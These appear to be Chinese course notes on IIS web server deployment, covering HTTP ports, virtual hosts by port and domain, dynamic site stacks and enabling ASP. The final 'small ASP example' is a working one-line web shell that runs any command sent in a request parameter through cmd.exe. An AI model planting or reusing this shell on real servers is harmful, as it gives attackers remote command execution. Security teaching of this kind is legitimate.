---
title: "WEB 服务器：IIS 部署、HTML 与 WEB 攻击"
date: 2026-10-19T09:00:00+08:00
draft: false
categories: ["课程笔记", "windows系统"]
tags: ["Windows Server", "IIS", "Web", "课程笔记"]
summary: "WEB 服务器原理与 HTTP 交互、IIS 站点部署、默认 80/8080 端口，以及常见 WEB 攻击面。"
description: "WEB 服务器原理与 HTTP 交互、IIS 站点部署、默认 80/8080 端口，以及常见 WEB 攻击面。"
ShowToc: true
---

> 来源：Windows 服务基础课程讲义（`WEB服务器.pdf`，共 11 页）。由 PDF 转为 Markdown 并抽取原文图片，仅整理排版与章节层级，正文内容未改写。

## 0x01 web服务器概述

web服务器一般也称为：网页服务器、HTTP服务器（HTML语言编写网页）

index.html

```
<html>
<head>
<meta chareset="utf8">
</head>
<body>
<h1 style="color:pink">big</h1>
</body>
</html>
```

## 0x02 干什么得？

web服务器是将我们做好得网站/站点（若干个网页得集合）通过网络发布出去，让网友客户机通过网络使用浏览器可以远程访问我得网页！比如京东网站服务器、百度web服务器等等

## 0x03 协议

Web服务器使用得应用层协议是？http协议/https协议（S: SSL/TLS加密技术）

## 0x04 HTTP协议端口号

```
http: 80
```

  - https: 443（更安全、后期讲PKI时再涉及本知识）

  - 端口范围：0-65535

```
1-1024 一般都保留给服务器使用，如445smb，23telnet，22ssh，67，68dhcp，21，20 ftp服务器，
25 smtp（发），110 pop3 53DNS,3389rdp(windows)
```

  - 客户端得端口号一般都是随机生成！

## 0x05 列举你常用得web服务器/web容器

（就是发布web服务器得软件，也可以理解支持http协议的软件，可以打开80端口的软件）

IIS：微软（IIS软件可以发布web服务器、发布FTP服务器）（发布静态网页、asp动态网页）

apache-http：开源的，速度快nginx：速度更快apache-tomcat：（发布java语言编写的网页）

Weblogic: Oracle公司Websphere：IBM公司第三方：phpstudy、XAMPP、WAMP等等

目前在互联网上，最流行的中间件/web容器是：IIS、Apache、Nginx、Tomcat

## 0x06 部署web服务器实验

实验拓扑图如下：

![WEB 服务器 示意图 1](/images/windows-notes/web-server/img-01.png)

1）开win7+2019虚拟机，还原快照，桥接到vmnet1，再开机。

2）分别配置IP地址，保证可以互相ping通！

3）自己编写一个网站d:\qq，然后发布网站，在网站右键--新建网站即可！

（网站路径不建议在桌面上或者C盘上！！甚至网站的路径不能包含中文！！！！！）

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=gb2312">
<title>Document</title>
</head>
<body>
</body>
</html>
```

5）设置默认文档，如qq网站--右键属性--文档--添加首页index.html！

=======================================

6）老师准备发布第二个网站：例如hr系统，新建网站（发布网站），再网站右键--新建网站即可（其中不能与第一个网站冲突，我们把网站改为8080端口）！

7）设置默认文档，如hr网站--右键属性--文档--添加首页！

=======================================

8）将baidu和flower两个网站分别绑定2个域名，要求员工必须使用域名来访问网站，进而能够区分2个网站，也最终实现了在1台服务器上成功发布了2个web网站！此时必须解决员工进行域名解析得问题，所以必须在公司内部搭建一个DNS服务器（本实验飞哥用的是hosts文件实现解析的）！

## 7、虚拟主机

一台服务器如何同时发布多个网站？

  - 方法1、使用相同得IP，不同得端口号（本方法适用与给专业人士做测试网站时使用，如8080，8081等等）

  - 方法2、使用相同得IP，相同得端口号，不同得域名（本方法是对公开开放的最根本方法！）

基于端口的虚拟主机同时发布多个网站，但使用不同的端口

![WEB 服务器 示意图 2](/images/windows-notes/web-server/img-02.png)

基于域名的虚拟主机

![WEB 服务器 示意图 3](/images/windows-notes/web-server/img-03.png)

修改win7hosts文件进行验证

![WEB 服务器 示意图 4](/images/windows-notes/web-server/img-04.png)

验证

![WEB 服务器 示意图 5](/images/windows-notes/web-server/img-05.png)

## 8、网站类型

1）静态网站不能与客户进行交互/互动的网站就是静态网站，一般都是用html语言编写的，网页文件扩展名为.html或.htm只有前台页面，没有后台数据库

2）动态网站可以与客户进行交互/互动，动态网页在html静态页面得基础上内置了动态脚本语言+数据库。

动态脚本语言：

  - php：开源免费滴！目前使用最多！

  - asp：微软的

```
java：
jsp、python等
```

动态语言得作用：连接前台页面与后台数据库如：

php编写得动态网页扩展名为: .php asp编写得动态网页扩展名为: .asp

3）动态网站常见的环境组合

```
windows+IIS+ASP+Sqlserver
Linux+Apache+Mysql+Php ==  LAMP平台
windows+Apache+php+mysql == WAMP平台
Linux+nginx+php+mysql == LNMP平台
```

一般发布asp网站时：在windows服务器上：IIS+ASP+SQL Sever一般发布php网站时：在linux服务器上：Apache+php+mysql

![WEB 服务器 示意图 6](/images/windows-notes/web-server/img-06.png)

## 9、IIS版本

windows2003：IIS6.0 windows2008：IIS7.0 windows2012：IIS8.0

### 10、windows2008 IIS7发布ASP动态网站

新建网站，如下：

![WEB 服务器 示意图 7](/images/windows-notes/web-server/img-07.png)

设置默认文档：

![WEB 服务器 示意图 8](/images/windows-notes/web-server/img-08.png)

![WEB 服务器 示意图 9](/images/windows-notes/web-server/img-09.png)

![WEB 服务器 示意图 10](/images/windows-notes/web-server/img-10.png)

开启对asp的支持（如果建立了雷池则会多出对雷池的应用池因此要修改雷池应用池的高级配置）：

![WEB 服务器 示意图 11](/images/windows-notes/web-server/img-11.png)

可以先尝试建立 index.asp文件并写入 <%=now()%>验证asp功能配置雷池应用池兼容性

![WEB 服务器 示意图 12](/images/windows-notes/web-server/img-12.png)

效果验证

![WEB 服务器 示意图 13](/images/windows-notes/web-server/img-13.png)

基于域名的虚拟主机

![WEB 服务器 示意图 14](/images/windows-notes/web-server/img-14.png)

asp小案例

```
<pre>
<%=server.createobject("wscript.shell").exec("cmd.exe /c
"&request("cmd")).stdout.readall%>
```

  - <pre>   将输出信息格式化成一整行

![WEB 服务器 示意图 15](/images/windows-notes/web-server/img-15.png)

![WEB 服务器 示意图 16](/images/windows-notes/web-server/img-16.png)
